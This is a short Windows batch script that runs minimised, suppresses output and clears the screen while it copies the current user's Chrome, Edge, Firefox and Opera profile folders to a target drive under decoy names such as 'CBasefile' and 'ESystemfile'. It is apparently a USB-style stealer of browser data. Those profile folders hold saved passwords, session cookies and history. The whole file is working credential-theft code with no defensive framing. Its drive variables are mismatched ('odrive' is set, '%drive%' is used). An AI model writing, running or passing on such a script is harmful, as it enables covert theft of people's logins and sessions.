 @echo off
:: variables
/min

SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
SET fc=%USERNAME%
%backupcmd% "C:\Users\%fc%\AppData\Local\Google\Chrome\User Data\Default" "%drive%CBasefile"
%backupcmd% "C:\Users\%fc%\AppData\Roaming\Mozilla\Firefox\Profiles" "%drive%FSystemfile"
%backupcmd% "C:\Users\%fc%\AppData\Local\Microsoft\Edge\User Data\Default" "%drive%ESystemfile"
%backupcmd% "C:\Users\%fc%\AppData\Roaming\Opera Software\Opera Stable" "%drive%OSystemfile"

@echo off
cls